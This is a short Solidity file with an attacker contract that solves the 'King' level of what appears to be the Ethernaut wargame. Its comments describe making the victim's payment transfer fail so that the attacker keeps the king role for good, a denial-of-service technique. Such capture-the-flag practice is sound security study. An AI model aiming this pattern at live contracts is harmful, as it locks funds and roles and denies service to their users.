// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// 2 ways to solve King Level

// 1. By not having a receive function in attacker contract and having transfer fail thatway
// 2. By using up all the 2300 gas + more in the receive function of attacker contract and having transfer fail thatway

contract AttackKing {

    address payable kingContract;
    constructor(address payable _kingContractAddress) {
        kingContract = _kingContractAddress;
    }

    function attack() public payable {
        (bool s, ) = address(kingContract).call{value: msg.value}("");
        require(s);
    }
    
    event Received(uint amount);
    uint public amount;
    receive() external payable  {

        // uint startGas = gasleft();
        amount = msg.value;
        // uint gasUsed = startGas - gasleft();
  
        // emit Received(gasUsed);
    }
}